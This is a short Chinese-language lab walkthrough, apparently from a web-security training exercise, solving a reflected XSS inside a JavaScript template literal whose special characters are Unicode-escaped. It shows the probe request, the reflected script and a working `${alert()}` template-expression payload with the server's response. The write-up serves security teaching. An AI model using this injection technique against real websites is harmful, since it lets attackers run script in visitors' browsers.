# 实验：尖括号、单双引号、反斜杠和反引号经过 Unicode 转义的模板字面量（template literal）中的反射型 XSS

本实验在博客搜索功能中包含一个反射型跨站脚本漏洞。该回显发生在一段模板字符串（template string）内部，其中尖括号、单引号和双引号经过了 HTML 编码，且反引号已被转义。为了解决本实验，请执行一个跨站脚本攻击，在模板字符串内部调用 `alert` 函数。

## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=test'"<>(){}`` HTTP/2
    ```

    - 服务器响应
        ```html
        <script>
            var message = `0 search results for 'test\u0027\u0022\u003c\u003e(){}\u0060\u0060'`;
            document.getElementById('searchMessage').innerText = message;
        </script>
        ```
        - 上下文
            - ``` `` ``` 模板字符串内
            - 使用 Unicode 编码（之后在 JS 解析中将还原为字符）

攻击
- 使用 JS 模板字符串的表达式符号 `${}` 构造载荷
    `${alert()}`

    - 服务器响应
        ```js
        var message = `0 search results for '${alert()}'`;
        ```
